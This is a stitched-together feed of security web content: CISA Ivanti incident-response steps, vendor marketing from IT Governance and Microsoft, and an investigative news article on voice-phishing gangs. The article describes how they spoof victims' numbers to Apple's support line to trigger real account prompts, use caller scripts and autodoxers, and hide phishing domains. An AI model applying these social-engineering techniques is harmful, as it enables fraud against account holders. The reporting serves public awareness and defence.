&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/data-protection-staff-awareness" rel="noreferrer noopener" target="_blank"&gt;Staff awareness training&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;Up-to-date, effective &lt;a href="https://www.itgovernance.co.uk/shop/product/gdpr-documentation-toolkit" rel="noreferrer noopener" target="_blank"&gt;policies and procedures&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;Take the next step in your GDPR compliance project&lt;/h2&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="alignright size-large is-resized" id="cc-logo"&gt;&lt;a href="https://www.itgovernance.co.uk/cybercomply" rel=" noreferrer noopener" target="_blank"&gt;&lt;img alt="" src="https://www.itgovernance.co.uk/shop/images/product/medium/5370.png" style="width: 200px;" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;These eight steps should get your GDPR project off to a good start, laying the groundwork for both compliance and more efficient business processes.&lt;/p&gt;



&lt;p&gt;However, compliance isn’t a one-off activity – it’s something to &lt;em&gt;maintain&lt;/em&gt;.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;&lt;a href="https://www.itgovernance.co.uk/cybercomply" rel="noreferrer noopener" target="_blank"&gt;CyberComply&lt;/a&gt;&lt;/strong&gt; can help with this. In just one powerful tool, you can:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Manage your GDPR compliance gaps;&lt;/li&gt;



&lt;li&gt;Map data flows;&lt;/li&gt;



&lt;li&gt;Automate ROPA creation; and&lt;/li&gt;



&lt;li&gt;Increase efficiency and minimise errors when conducting DPIAs.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Organizations should report incidents and anomalous activity to CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.&lt;/p&gt;

&lt;/ul&gt;
&lt;p&gt;&lt;br /&gt;For all instances of Ivanti Connect Secure, Policy Secure, and ZTA Gateways, see the following steps for general hunting guidance:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Conduct threat hunting actions: &amp;nbsp;
&lt;ol&gt;
&lt;li&gt;Run the In-Build Integrity Checker Tool (ICT). Instructions can be found&amp;nbsp;&lt;a href="https://forums.ivanti.com/s/article/KB44859?language=en_US" title="KB44859 - How to Use the In-Build ICT, "&gt;here&lt;/a&gt;.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Conduct threat hunt actions on any systems connected to—or recently connected to—the affected Ivanti device. &amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;If threat hunting actions determine no compromise:&amp;nbsp;
&lt;ol&gt;
&lt;li&gt;Factory reset the device and apply the patch described in&amp;nbsp;&lt;a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283" title=" Security Advisory Ivanti Connect Secure, Policy Secure &amp;amp; ZTA Gateways (CVE-2025-0282, CVE-2025-0283)"&gt;Security Advisory Ivanti Connect Secure, Policy Secure &amp;amp; ZTA Gateways (CVE-2025-0282, CVE-2025-0283)&lt;/a&gt;.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Monitor the authentication or identity management services that could be exposed.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Continue to audit privilege level access accounts.&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;If threat hunting actions determine compromise:&amp;nbsp;
&lt;ol&gt;
&lt;li&gt;Report to CISA and Ivanti immediately to start forensic investigation and incident response activities. &amp;nbsp;&lt;/li&gt;
&lt;li&gt;Disconnect instances of affected Ivanti Connect Secure products. &amp;nbsp;&lt;/li&gt;
&lt;li&gt;Isolate the systems from any enterprise resources to the greatest degree possible.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Revoke and reissue any connected or exposed certificates, keys, and passwords, to include the following:&amp;nbsp;
&lt;ol&gt;
&lt;li&gt;Reset the admin enable password.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Reset stored application programming interface (API) keys.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;Reset the password of any local user defined on the gateway, including service accounts used for auth server configuration(s).&amp;nbsp;&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;If domain accounts associated with the affected products have been compromised:&amp;nbsp;
&lt;ol&gt;
&lt;li&gt;Reset passwords twice for on premise accounts, revoke Kerberos tickets, and then revoke tokens for cloud accounts in hybrid deployments.&amp;nbsp;&lt;/li&gt;
&lt;li&gt;For cloud joined/registered devices, disable devices in the cloud to revoke the device tokens.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;After investigation, fully patch and restore system prior to returning any device to service.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;

In Tony&amp;#8217;s ordeal, the crooks appear to have initially contacted him via &lt;strong&gt;Google Assistant&lt;/strong&gt;, an AI-based service that can engage in two-way conversations. The phishers also abused legitimate Google services to send Tony an email from google.com, and to send a Google account recovery prompt to all of his signed-in devices.&lt;/p&gt;
&lt;p&gt;Today&amp;#8217;s story pivots off of Tony&amp;#8217;s heist and new details shared by a scammer to explain how these voice phishing groups are abusing a legitimate Apple telephone support line to generate &amp;#8220;account confirmation&amp;#8221; message prompts from Apple to their customers.&lt;/p&gt;
&lt;p&gt;Before we get to the Apple scam in detail, we need to revisit Tony&amp;#8217;s case. The phishing domain used to steal roughly $4.7 million in cryptocurrencies from Tony was &lt;strong&gt;verify-trezor[.]io&lt;/strong&gt;. This domain was featured in &lt;a href="https://www.lookout.com/threat-intelligence/article/cryptochameleon-fcc-phishing-kit" rel="noopener" target="_blank"&gt;a writeup from February 2024&lt;/a&gt; by the security firm &lt;strong&gt;Lookout&lt;/strong&gt;, which found it was one of dozens being used by a prolific and audacious voice phishing group it dubbed &amp;#8220;&lt;strong&gt;Crypto Chameleon&lt;/strong&gt;.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Crypto Chameleon was brazenly trying to voice phish employees at the &lt;strong&gt;U.S. Federal Communications Commission&lt;/strong&gt; (FCC), as well as those working at the cryptocurrency exchanges &lt;strong&gt;Coinbase&lt;/strong&gt; and &lt;strong&gt;Binance&lt;/strong&gt;. Lookout researchers discovered multiple voice phishing groups were using a new phishing kit that closely mimicked the single sign-on pages for &lt;strong&gt;Okta&lt;/strong&gt; and other authentication providers.&lt;/p&gt;
&lt;p&gt;As we&amp;#8217;ll see in a moment, that phishing kit is operated and rented out by a cybercriminal known as &amp;#8220;&lt;strong&gt;Perm&lt;/strong&gt;&amp;#8221; a.k.a. &amp;#8220;&lt;strong&gt;Annie&lt;/strong&gt;.&amp;#8221; Perm is the current administrator of &lt;strong&gt;Star Fraud&lt;/strong&gt;, one of the more consequential cybercrime communities on Telegram and one that has emerged as a foundry of innovation in voice phishing attacks.&lt;/p&gt;
&lt;p&gt;A review of the many messages that Perm posted to Star Fraud and other Telegram channels showed they worked closely with another cybercriminal who went by the handles &amp;#8220;&lt;strong&gt;Aristotle&lt;/strong&gt;&amp;#8221; and just &amp;#8220;&lt;strong&gt;Stotle&lt;/strong&gt;.&amp;#8221;&lt;/p&gt;
&lt;p&gt;It is not clear what caused the rift, but at some point last year Stotle decided to turn on his erstwhile business partner Perm, sharing extremely detailed videos, tutorials and secrets that shed new light on how these phishing panels operate.&lt;/p&gt;
&lt;p&gt;Stotle explained that the division of spoils from each robbery is decided in advance by all participants. Some co-conspirators will be paid a set fee for each call, while others are promised a percentage of any overall amount stolen. The person in charge of managing or renting out the phishing panel to others will generally take a percentage of each theft, which in Perm&amp;#8217;s case is 10 percent.&lt;/p&gt;
&lt;p&gt;When the phishing group settles on a target of interest, the scammers will create and join a new &lt;strong&gt;Discord&lt;/strong&gt; channel. This allows each logged on member to share what is currently on their screen, and these screens are tiled in a series of boxes so that everyone can see all other call participant screens at once.&lt;/p&gt;
&lt;p&gt;Each participant in the call has a specific role, including:&lt;/p&gt;
&lt;p&gt;-The Caller: The person speaking and trying to social engineer the target.&lt;br /&gt;
-The Operator: The individual managing the phishing panel, silently moving the victim from page to page.&lt;br /&gt;
-The Drainer: The person who logs into compromised accounts to drain the victim&amp;#8217;s funds.&lt;br /&gt;
-The Owner: The phishing panel owner, who will frequently listen in on and participate in scam calls.&lt;/p&gt;
&lt;h2&gt;&amp;#8216;OKAY, SO THIS REALLY IS APPLE&amp;#8217;&lt;/h2&gt;
&lt;p&gt;In one video of a live voice phishing attack shared by Stotle, scammers using Perm&amp;#8217;s panel targeted a musician in California. Throughout the video, we can see Perm monitoring the conversation and operating the phishing panel in the upper right corner of the screen.&lt;/p&gt;
&lt;div style="text-align: center;"&gt;&lt;span class="mce_SELRES_start" style="display: inline-block; width: 0px; overflow: hidden; line-height: 0;"&gt;﻿&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;In the first step of the attack, they &lt;a href="https://krebsonsecurity.com/2024/03/recent-mfa-bombing-attacks-targeting-apple-users/" rel="noopener" target="_blank"&gt;peppered the target&amp;#8217;s Apple device with notifications from Apple&lt;/a&gt; by attempting to reset his password. Then a &amp;#8220;&lt;strong&gt;Michael Keen&lt;/strong&gt;&amp;#8221; called him, spoofing Apple&amp;#8217;s phone number and saying they were with Apple&amp;#8217;s account recovery team.&lt;/p&gt;
&lt;p&gt;The target told Michael that someone was trying to change his password, which Michael calmly explained they would investigate. Michael said he was going to send a prompt to the man&amp;#8217;s device, and proceeded to place a call to an automated line that answered as Apple support saying, &amp;#8220;I&amp;#8217;d like to send a consent notification to your Apple devices. Do I have permission to do that?&amp;#8221;&lt;/p&gt;
&lt;p&gt;In this segment of the video, we can see the operator of the panel is calling the real Apple customer support phone number &lt;strong&gt;800-275-2273&lt;/strong&gt;, but they are doing so by spoofing the target&amp;#8217;s phone number (the victim&amp;#8217;s number is redacted in the video above). That&amp;#8217;s because calling this support number from a phone number tied to an Apple account and selecting &amp;#8220;1&amp;#8221; for &amp;#8220;yes&amp;#8221; will then send an alert from Apple that displays the following message on all associated devices:&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70000" style="width: 403px;"&gt;&lt;img alt="" class="size-full wp-image-70000" height="448" src="https://krebsonsecurity.com/wp-content/uploads/2025/01/appleconfirmation.png" width="393" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70000"&gt;Calling the Apple support number 800-275-2273 from a phone number tied to an Apple account will cause a prompt similar to this one to appear on all connected Apple devices.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;KrebsOnSecurity asked two different security firms to test this using the caller ID spoofing service shown in Perm&amp;#8217;s video, and sure enough calling that 800 number for Apple by spoofing my phone number as the source caused the Apple Account Confirmation to pop up on all of my signed-in Apple devices.&lt;/p&gt;
&lt;p&gt;In essence, the voice phishers are using an automated Apple phone support line to send notifications from Apple and to trick people into thinking they&amp;#8217;re really talking with Apple. The phishing panel video leaked by Stotle shows this technique fooled the target, who felt completely at ease that he was talking to Apple after receiving the support prompt on his iPhone.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Okay, so this really is Apple,&amp;#8221; the man said after receiving the alert from Apple. &amp;#8220;Yeah, that&amp;#8217;s definitely not me trying to reset my password.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;Not a problem, we can go ahead and take care of this today,&amp;#8221; Michael replied. &amp;#8220;I&amp;#8217;ll go ahead and prompt your device with the steps to close out this ticket. Before I do that, I do highly suggest that you change your password in the settings app of your device.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The target said they weren&amp;#8217;t sure exactly how to do that. Michael replied &amp;#8220;no problem,&amp;#8221; and then described how to change the account password, which the man said he did on his own device. At this point, the musician was still in control of his iCloud account.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Password is changed,&amp;#8221; the man said. &amp;#8220;I don&amp;#8217;t know what that was, but I appreciate the call.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;Yup,&amp;#8221; Michael replied, setting up the killer blow. &amp;#8220;I&amp;#8217;ll go ahead and prompt you with the next step to close out this ticket. Please give me one moment.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The target then received a text message that referenced information about his account, stating that he was in a support call with Michael. Included in the message was a link to a website that mimicked Apple&amp;#8217;s iCloud login page &amp;#8212; &lt;strong&gt;17505-apple[.]com&lt;/strong&gt;. Once the target navigated to the phishing page, the video showed Perm&amp;#8217;s screen in the upper right corner opening the phishing page from their end.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Oh okay, now I log in with my Apple ID?,&amp;#8221; the man asked.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Yup, then just follow the steps it requires, and if you need any help, just let me know,&amp;#8221; Michael replied.&lt;/p&gt;
&lt;p&gt;As the victim typed in their Apple password and one-time passcode at the fake Apple site, Perm&amp;#8217;s screen could be seen in the background logging into the victim&amp;#8217;s iCloud account.&lt;/p&gt;
&lt;p&gt;It&amp;#8217;s unclear whether the phishers were able to steal any cryptocurrency from the victim in this case, who did not respond to requests for comment. However, shortly after this video was recorded, someone leaked several music recordings stolen from the victim&amp;#8217;s iCloud account.&lt;/p&gt;
&lt;p&gt;At the conclusion of the call, Michael offered to configure the victim&amp;#8217;s Apple profile so that any further changes to the account would need to happen in person at a physical Apple store. This appears to be one of several scripted ploys used by these voice phishers to gain and maintain the target&amp;#8217;s confidence.&lt;/p&gt;
&lt;p&gt;A tutorial shared by Stotle titled &amp;#8220;Social Engineering Script&amp;#8221; includes a number of tips for scam callers that can help establish trust or a rapport with their prey. When the callers are impersonating Coinbase employees, for example, they will offer to sign the user up for the company&amp;#8217;s free security email newsletter.&lt;/p&gt;
&lt;p&gt;&amp;#8220;Also, for your security, we are able to subscribe you to Coinbase Bytes, which will basically give you updates to your email about data breaches and updates to your Coinbase account,&amp;#8221; the script reads. &amp;#8220;So we should have gone ahead and successfully subscribed you, and you should have gotten an email confirmation. Please let me know if that is the case. Alright, perfect.&amp;#8221;&lt;/p&gt;
&lt;p&gt;In reality, all they are doing is entering the target&amp;#8217;s email address into Coinbase&amp;#8217;s public email newsletter signup page, but it&amp;#8217;s a remarkably effective technique because it demonstrates to the would-be victim that the caller has the ability to send emails from Coinbase.com.&lt;/p&gt;
&lt;p&gt;Asked to comment for this story, Apple said there has been no breach, hack, or technical exploit of iCloud or Apple services, and that the company is continuously adding new protections to address new and emerging threats. For example, it said it has implemented rate limiting for multi-factor authentication requests, which &lt;a href="https://krebsonsecurity.com/2024/03/recent-mfa-bombing-attacks-targeting-apple-users/" rel="noopener" target="_blank"&gt;have been abused by voice phishing groups to impersonate Apple&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Apple said its representatives will never ask users to provide their password, device passcode, or two-factor authentication code or to enter it into a web page, even if it looks like an official Apple website. If a user receives a message or call that claims to be from Apple, &lt;a href="https://support.apple.com/en-us/120569" rel="noopener" target="_blank"&gt;here is what the user should expect&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;span id="more-69922"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;AUTODOXERS&lt;/h2&gt;
&lt;p&gt;According to Stotle, the target lists used by their phishing callers originate mostly from a few crypto-related data breaches, including the 2022 and &lt;a href="https://blog.trezor.io/trezor-security-update-stay-vigilant-against-potential-phishing-attack-bb05015a21f8?gi=4a9e1da3b8b2" rel="noopener" target="_blank"&gt;2024 breaches&lt;/a&gt; involving user account data stolen from cryptocurrency hardware wallet vendor &lt;strong&gt;Trezor&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Perm&amp;#8217;s group and other crypto phishing gangs rely on a mix of homemade code and third-party data broker services to refine their target lists. Known as &amp;#8220;&lt;strong&gt;autodoxers&lt;/strong&gt;,&amp;#8221; these tools help phishing gangs quickly automate the acquisition and/or verification of personal data on a target prior to each call attempt.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_69998" style="width: 758px;"&gt;&lt;img alt="" class=" wp-image-69998" height="592" src="https://krebsonsecurity.com/wp-content/uploads/2025/01/vbals-autodoxer.png" width="748" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-69998"&gt;One &amp;#8220;autodoxer&amp;#8221; service advertised on Telegram that promotes a range of voice phishing tools and services.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Stotle said their autodoxer used a Telegram bot that leverages hacked accounts at consumer data brokers to gather a wealth of information about their targets, including their full Social Security number, date of birth, current and previous addresses, employer, and the names of family members.&lt;/p&gt;
&lt;p&gt;The autodoxers are used to verify that each email address on a target list has an active account at Coinbase or another cryptocurrency exchange, ensuring that the attackers don&amp;#8217;t waste time calling people who have no cryptocurrency to steal.&lt;/p&gt;
&lt;p&gt;Some of these autodoxer tools also will check the value of the target&amp;#8217;s home address at property search services online, and then sort the target lists so that the wealthiest are at the top.&lt;/p&gt;
&lt;h2&gt;CRYPTO THIEVES IN THE SHARK TANK&lt;/h2&gt;
&lt;p&gt;Stotle&amp;#8217;s messages on Discord and Telegram show that a phishing group renting Perm&amp;#8217;s panel voice-phished tens of thousands of dollars worth of cryptocurrency from the billionaire &lt;strong&gt;Mark Cuban&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&amp;#8220;I was an idiot,&amp;#8221; Cuban told KrebsOnsecurity when asked about &lt;a href="https://www.dallasnews.com/business/2024/06/23/mark-cubans-public-email-was-hacked-after-receiving-call-from-a-fake-google-rep/?outputType=amp" rel="noopener" target="_blank"&gt;the June 2024 attack&lt;/a&gt;, which he first disclosed in a short-lived post on Twitter/X. &amp;#8220;We were shooting Shark Tank and I was rushing between pitches.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70008" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-70008" height="435" src="https://krebsonsecurity.com/wp-content/uploads/2025/01/sharktank.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70008"&gt;Image: Shutterstock, ssi77.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Cuban said he first received a notice from Google that someone had tried to log in to his account. Then he got a call from what appeared to be a Google phone number. Cuban said he ignored several of these emails and calls until he decided they probably wouldn&amp;#8217;t stop unless he answered.&lt;/p&gt;
&lt;p&gt;&amp;#8220;So I answered, and wasn&amp;#8217;t paying enough attention,&amp;#8221; he said. &amp;#8220;They asked for the circled number that comes up on the screen. Like a moron, I gave it to them, and they were in.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Unfortunately for Cuban, somewhere in his inbox were the secret &amp;#8220;seed phrases&amp;#8221; protecting two of his cryptocurrency accounts, and armed with those credentials the crooks were able to drain his funds. All told, the thieves managed to steal roughly $43,000 worth of cryptocurrencies from Cuban&amp;#8217;s wallets &amp;#8212; a relatively small heist for this crew.&lt;/p&gt;
&lt;p&gt;&amp;#8220;They must have done some keyword searches,&amp;#8221; once inside his Gmail account, Cuban said. &amp;#8220;I had sent myself an email I had forgotten about that had my seed words for 2 accounts that weren&amp;#8217;t very active any longer. I had moved almost everything but some smaller balances to Coinbase.&amp;#8221;&lt;/p&gt;
&lt;h2&gt;LIFE IS A GAME: MONEY IS HOW WE KEEP SCORE&lt;/h2&gt;
&lt;p&gt;Cybercriminals involved in voice phishing communities on Telegram are universally obsessed with their crypto holdings, mainly because in this community one&amp;#8217;s demonstrable wealth is primarily what confers social status. It is not uncommon to see members sizing one another up using a verbal shorthand of &amp;#8220;figs,&amp;#8221; as in figures of crypto wealth.&lt;/p&gt;
&lt;p&gt;For example, a low-level caller with no experience will sometimes be mockingly referred to as a 3fig or 3f, as in a person with less than $1,000 to their name. Salaries for callers are often also referenced this way, e.g. &amp;#8220;Weekly salary: 5f.&amp;#8221;&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70058" style="width: 759px;"&gt;&lt;img alt="" class=" wp-image-70058" height="416" src="https://krebsonsecurity.com/wp-content/uploads/2025/01/howitstartedhowitsgoing.png" width="749" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70058"&gt;This meme shared by Stotle uses humor to depict an all-too-common pathway for voice phishing callers, who are often minors recruited from gaming networks like Minecraft and Roblox. The image that Lookout used in its blog post for Crypto Chameleon can be seen in the lower right hooded figure.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;Voice phishing groups frequently require new members to provide &amp;#8220;proof of funds&amp;#8221; &amp;#8212; screenshots of their crypto holdings, ostensibly to demonstrate they are not penniless &amp;#8212; before they&amp;#8217;re allowed to join.&lt;/p&gt;
&lt;p&gt;This proof of funds (POF) demand is typical among thieves selling high-dollar items, because it tends to cut down on the time-wasting inquiries from criminals who can&amp;#8217;t afford what&amp;#8217;s for sale anyway. But it has become so common in cybercrime communities that there are now several services designed to create fake POF images and videos, allowing customers to brag about large crypto holdings without actually possessing said wealth.&lt;/p&gt;
&lt;p&gt;Several of the phishing panel videos shared by Stotle feature audio that suggests co-conspirators were practicing responses to certain call scenarios, while other members of the phishing group critiqued them or tried disrupt their social engineering by being verbally abusive.&lt;/p&gt;
&lt;p&gt;These groups will organize and operate for a few weeks, but tend to disintegrate when one member of the conspiracy decides to steal some or all of the loot, referred to in these communities as &amp;#8220;snaking&amp;#8221; others out of their agreed-upon sums. Almost invariably, the phishing groups will splinter apart over the drama caused by one of these snaking events, and individual members eventually will then re-form a new phishing group.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Allison Nixon&lt;/strong&gt; is the chief research officer for &lt;a href="https://www.unit221b.com" rel="noopener" target="_blank"&gt;Unit 221B&lt;/a&gt;, a cybersecurity firm in New York that has worked on a number of investigations involving these voice phishing groups. Nixon said the constant snaking within the voice phishing circles points to a psychological self-selection phenomenon that is in desperate need of academic study.&lt;/p&gt;
&lt;p&gt;&amp;#8220;In short, a person whose moral compass lets them rob old people will also be a bad business partner,&amp;#8221; Nixon said. &amp;#8220;This is another fundamental flaw in this ecosystem and why most groups end in betrayal. This structural problem is great for journalists and the police too. Lots of snitching.&amp;#8221;&lt;/p&gt;
&lt;h2&gt;POINTS FOR BRAZENNESS&lt;/h2&gt;
&lt;p&gt;Asked about the size of Perm&amp;#8217;s phishing enterprise, Stotle said there were dozens of distinct phishing groups paying to use Perm&amp;#8217;s panel. He said each group was assigned their own subdomain on Perm&amp;#8217;s main &amp;#8220;command and control server,&amp;#8221; which naturally uses the domain name &lt;strong&gt;commandandcontrolserver[.]com&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;A review of that domain&amp;#8217;s history via &lt;strong&gt;DomainTools.com&lt;/strong&gt; shows there are at least 57 separate subdomains scattered across commandandcontrolserver[.]com and two other related control domains &amp;#8212; &lt;strong&gt;thebackendserver[.]com&lt;/strong&gt; and &lt;strong&gt;lookoutsucks[.]com&lt;/strong&gt;. That latter domain was created and deployed shortly after Lookout published its blog post on Crypto Chameleon.&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://urlscan.io/search/#page.url%3A%22captcha%3Forigin%3D%22" rel="noopener" target="_blank"&gt;dozens of phishing domains that phone home to these control servers&lt;/a&gt; are all kept offline when they are not actively being used in phishing attacks. A social engineering training guide shared by Stotle explains this practice minimizes the chances that a phishing domain will get &amp;#8220;redpaged,&amp;#8221; a reference to the default red warning pages served by Google Chrome or Firefox whenever someone tries to visit a site that&amp;#8217;s been flagged for phishing or distributing malware.&lt;/p&gt;
&lt;p&gt;What&amp;#8217;s more, while the phishing sites are live their operators typically place a CAPTCHA challenge in front of the main page to prevent security services from scanning and flagging the sites as malicious.&lt;/p&gt;
&lt;p&gt;It may seem odd that so many cybercriminal groups operate so openly on instant collaboration networks like Telegram and Discord. After all, this blog is replete with stories about cybercriminals getting caught thanks to personal details they inadvertently leaked or disclosed themselves.&lt;/p&gt;
&lt;p&gt;Nixon said the relative openness of these cybercrime communities makes them inherently risky, but it also allows for the rapid formation and recruitment of new potential co-conspirators. Moreover, today&amp;#8217;s English-speaking cybercriminals tend to be &lt;a href="https://krebsonsecurity.com/2024/10/lamborghini-carjackers-lured-by-243m-cyberheist/" rel="noopener" target="_blank"&gt;more afraid of getting home invaded or mugged by fellow cyber thieves&lt;/a&gt; than they are of being arrested by authorities.&lt;/p&gt;
&lt;p&gt;&amp;#8220;The biggest structural threat to the online criminal ecosystem is not the police or researchers, it is fellow criminals,&amp;#8221; Nixon said. &amp;#8220;To protect them from themselves, every criminal forum and marketplace has a reputation system, even though they know it&amp;#8217;s a major liability when the police come. That is why I am not worried as we see criminals migrate to various &amp;#8216;encrypted&amp;#8217; platforms that promise to ignore the police.

&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats.

&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/01/06/why-security-teams-rely-on-microsoft-defender-experts-for-xdr-for-managed-detection-and-response/"&gt;Why security teams rely on Microsoft Defender Experts for XDR for managed detection and response&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;The expanding attack surface is creating more opportunities for exploitation and adding to the pressure on security leaders and teams. Increasingly, organizations are investing in managed detection and response services (MDR) to bolster their security operations center (SOC) and meet the challenge.&lt;sup&gt; &lt;/sup&gt;Demand is growing rapidly: according to Frost &amp;amp; Sullivan, the market for MDR is expanding at a rate of 35.2% annually.&lt;sup&gt;1 &lt;/sup&gt;  &lt;/p&gt;



&lt;p&gt;While there are new vendors launching MDR services regularly, many security teams are turning to &lt;a href="https://www.microsoft.com/security/business/services/microsoft-defender-experts-xdr" rel="noreferrer noopener" target="_blank"&gt;Microsoft Defender Experts for XDR,&lt;/a&gt; a recognized leader, to deliver comprehensive coverage.&lt;sup&gt;1 &lt;/sup&gt;Employed worldwide by organizations across industries, Microsoft’s team of dedicated experts proactively hunts for cyberthreats and triages, investigates, and responds to incidents on a customer’s behalf around the clock across their most critical assets. Our proven service brings together in-house security professionals and industry-leading protection&lt;sup&gt; &lt;/sup&gt;with Microsoft Defender XDR to help security teams rapidly stop cyberthreats and keep their environments secure.&lt;sup&gt;2&lt;/sup&gt; &lt;/p&gt;

&lt;h2 class="wp-block-heading" id="reduce-the-staffing-burden-improve-security-coverage-and-focus-on-other-priorities"&gt;Reduce the staffing burden, improve security coverage, and focus on other priorities&lt;/h2&gt;



&lt;p&gt;Microsoft Defender Experts for XDR improves operational efficacy greatly while elevating an organization&amp;#8217;s security posture to a new level. The team of experts will monitor the environment, find and halt cyberthreats, and help contain incidents faster with human-led response and remediation. With Defender Experts for XDR, organizations will expand their threat protection capabilities, reduce the number of incidents over time, and have more resources to focus on other priorities.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="more-experts-on-your-side"&gt;More experts on your side&lt;/h3&gt;



&lt;p&gt;Scaling in-house security teams remains challenging. Security experts are not only scarce but expensive. The persistent gap in open security positions has widened to 25% since 2022, meaning one in four in-house security analyst positions will remain unfilled.&lt;sup&gt;3&lt;/sup&gt; In the &lt;a href="https://cdn-dynmedia-1.microsoft.com/is/content/microsoftcorp/microsoft/final/en-us/microsoft-brand/documents/Forrester-New-Tech-TEI-XDR.pdf" rel="noreferrer noopener" target="_blank"&gt;Forrester Consulting New Technology Project Total Economic Impact study&lt;/a&gt;, without Defender Experts for XDR, the in-house team size for the composite organization would need to increase by up to 30% in mid-impact scenario or 40%  in high-impact scenario in year one to provide the same level of threat detection service.&lt;sup&gt;4&lt;/sup&gt; When you consider the lack of available security talent, increasing an in-house team size by 40% poses significant security concerns to CISOs. Existing security team members won’t be able to perform all the tasks required. Many will be overworked, which may lead to burnout.&lt;/p&gt;



&lt;p&gt;With more than 34,000 full-time equivalent security engineers, Microsoft is one of the largest security companies in the world. Microsoft Defender Experts for XDR reinforces your security team with Microsoft security professionals to help reduce talent gap concerns. In addition to the team of experts, customers have additional Microsoft security resources to help with onboarding, recommendations, and strategic insights.&lt;/p&gt;



&lt;blockquote class="wp-block-quote blockquote is-layout-flow wp-block-quote-is-layout-flow"&gt;
&lt;p&gt;&lt;em&gt;“Microsoft has the assets and people I needed. All the technologies, Microsoft Azure, and a full software stack end-to-end, all combined together with the fabric of security. Microsoft [Defender Experts for XDR] has the people and the ability to hire and train those people with the most upmost skill set to deal with the issues we face.”&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;—Head of Cybersecurity Response Architecture, financial services industry&lt;/p&gt;
&lt;/blockquote&gt;



&lt;h3 class="wp-block-heading" id="accelerate-and-expand-protection-against-today-s-cyberthreats"&gt;Accelerate and expand protection against today’s cyberthreats&lt;/h3&gt;



&lt;p&gt;Microsoft Defender Experts for XDR deploys quickly. That’s welcome news to organizations concerned about maturing their security program and can’t wait for new staffing and capabilities to be developed in-house. Customers can quickly leverage the deep expertise of the Microsoft Defender Experts for XDR team to tackle the increasing number of sophisticated threats. &lt;/p&gt;


